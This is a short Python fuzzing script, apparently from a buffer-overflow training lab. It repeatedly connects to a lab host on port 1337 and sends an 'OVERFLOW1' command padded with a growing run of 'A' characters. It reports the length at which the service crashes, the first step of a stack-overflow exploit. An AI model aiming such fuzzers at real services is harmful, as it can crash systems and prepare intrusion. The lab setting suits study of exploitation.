import sys, socket
from time import sleep

buffer = 'A' * 100
timeout = 5
while True:
    try:
        # \r\n in the below line is the return carraige , to get to new file after writting password . something like that.
        payload = 'OVERFLOW1 /.:/' + buffer + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(('10.10.137.185', 1337))
        s.recv(1024)
        s.send((payload.encode()))
        s.recv(1024)
        s.close()
        sleep(1)


    except:

        print("fuzzing crashed at {} bytes".format(str(len(buffer))))
        sys.exit(0)

    buffer = buffer + 'A' * 100